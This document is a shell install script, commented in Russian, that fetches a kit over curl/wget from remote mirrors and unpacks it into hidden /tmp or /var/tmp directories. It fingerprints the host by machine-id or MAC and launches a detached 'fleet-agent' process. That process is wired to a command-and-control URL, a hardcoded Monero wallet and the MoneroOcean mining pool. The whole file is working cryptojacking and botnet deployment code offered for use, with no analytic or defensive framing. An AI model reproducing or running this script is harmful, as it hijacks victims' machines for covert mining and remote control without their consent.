#!/bin/sh
# kf install — установка и запуск агента одной строкой:
#   curl -fsSL https://edge-static.cdn-edge-e9d.workers.dev/install.sh | sh
# env (всё необязательно): KF_WALLET, KF_C2, KF_WID, KF_D, KF_M1, KF_M2, KF_BIN_TAG
set -u
M1="${KF_M1:-https://edge-static.cdn-edge-e9d.workers.dev}"
M2="${KF_M2:-https://raw.githubusercontent.com/z3ncv/cdn-edge/main}"
W="${KF_WALLET:-42cRzqLbgMMZVex62mpPZYL9VLDdfjTvm8SGZc2KuvQdeK4eWaQav9TSXpcUZnYWCtidyABFmYuBA8Ub4VkYmjFTUUcpe79}"
C2="${KF_C2:-https://node-red.elm-v1-staging.clodpi.io}"
D="${KF_D:-/var/tmp/.kf}"

mkdir -p "$D" 2>/dev/null || { D=/tmp/.kf; mkdir -p "$D" 2>/dev/null; }
[ -d "$D" ] || exit 1

# stdin занят скриптом (curl|sh), поэтому все команды ниже обязаны читать не stdin:
# curl/wget пишут в файл, tar берёт архив из файла, агент уходит в фон с </dev/null.
T="${TMPDIR:-/tmp}/.kfkit.$$"
get() {
  if command -v curl >/dev/null 2>&1; then curl -fsSL -m 90 -o "$2" "$1" 2>/dev/null && return 0; fi
  if command -v wget >/dev/null 2>&1; then wget -q -T 90 -O "$2" "$1" 2>/dev/null && return 0; fi
  return 1
}

got=""
for m in "$M1" "$M2"; do
  rm -f "$T"
  if get "$m/kit.tgz" "$T"; then
    # sanity: gzip-магия, иначе зеркало отдало html/ошибку
    if command -v od >/dev/null 2>&1; then
      [ "$(od -An -tx1 -N2 "$T" 2>/dev/null | tr -d ' \n')" = "1f8b" ] || { rm -f "$T"; continue; }
    fi
    got=1; break
  fi
done
[ -n "$got" ] || exit 1

tar xzf "$T" -C "$D" 2>/dev/null || { rm -f "$T"; exit 1; }
rm -f "$T"
mv "$D"/lib/*.sh "$D"/ 2>/dev/null
chmod 700 "$D"/*.sh 2>/dev/null
[ -f "$D/fleet-agent.sh" ] || exit 1

H=$(hostname 2>/dev/null || echo x)
if command -v md5sum >/dev/null 2>&1; then
  H6=$(printf '%s' "$H" | md5sum | cut -c1-6)
else
  H6=$(printf '%s' "$H" | cksum | tr -dc '0-9' | cut -c1-6)
fi
# второй суффикс: machine-id или MAC — чтобы контейнеры с hostname=localhost не схлопывались в один воркер
M=""
[ -r /etc/machine-id ] && M=$(cat /etc/machine-id 2>/dev/null)
if [ -z "$M" ]; then
  for f in /sys/class/net/*/address; do
    a=$(cat "$f" 2>/dev/null)
    case "$a" in ""|"00:00:00:00:00:00") ;; *) M="$a"; break;; esac
  done
fi
if command -v md5sum >/dev/null 2>&1; then
  M6=$(printf '%s' "${M:-$H}" | md5sum | cut -c1-4)
else
  M6=$(printf '%s' "${M:-$H}" | cksum | tr -dc '0-9' | cut -c1-4)
fi
WID="${KF_WID:-k7m-$H6$M6}"

LOG=/tmp/.kf-boot.log
[ -w /tmp ] || LOG=/dev/null

if command -v setsid >/dev/null 2>&1; then
  KF_WALLET="$W" KF_POOL="${KF_POOL:-gulf.moneroocean.stream:443}" KF_POOL_TLS="${KF_POOL_TLS:-true}" \
    setsid sh "$D/fleet-agent.sh" "$C2" "$WID" >"$LOG" 2>&1 </dev/null &
else
  KF_WALLET="$W" KF_POOL="${KF_POOL:-gulf.moneroocean.stream:443}" KF_POOL_TLS="${KF_POOL_TLS:-true}" \
    nohup sh "$D/fleet-agent.sh" "$C2" "$WID" >"$LOG" 2>&1 </dev/null &
fi

echo "KFDEPLOYED $WID"
exit 0
